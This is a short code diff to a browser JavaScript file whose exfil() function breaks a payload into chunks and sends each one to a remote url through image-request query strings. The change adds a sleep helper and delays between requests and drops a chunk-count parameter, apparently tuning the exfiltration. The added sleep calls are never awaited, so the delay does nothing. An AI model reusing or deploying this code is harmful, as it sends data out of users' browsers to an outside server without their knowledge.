@@ -8,6 +8,10 @@ function bytesToHex(bytes) {
   ).join("");
 }
 
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 // You almost certainly want UTF-8, which is
 // now natively supported:
 function stringToUTF8Bytes(string) {
@@ -91,6 +95,7 @@ function exfil() {
 
   var x = document.createElement("img");
   x.src = url + "exfil/init?noc=" + numberOfChunks;
+  sleep(100);
 
   // Exfiltrating Chunks
   for (i = 0 ; i < numberOfChunks; i++)
@@ -98,7 +103,8 @@ function exfil() {
     console.log("Chunk: "+ (i+1) + " of "+ (numberOfChunks));
     var exfilChunk = payload.slice(chunksize*i, chunksize*(i+1));
     var downloadImage = document.createElement("img");
-    downloadImage.src = url+"exfil?num="+i+ "&noc="+numberOfChunks+"&chunk="+exfilChunk;
+    downloadImage.src = url+"exfil?num="+i+"&chunk="+exfilChunk;
+    sleep(500);
   }
 
   var x = document.createElement("img")
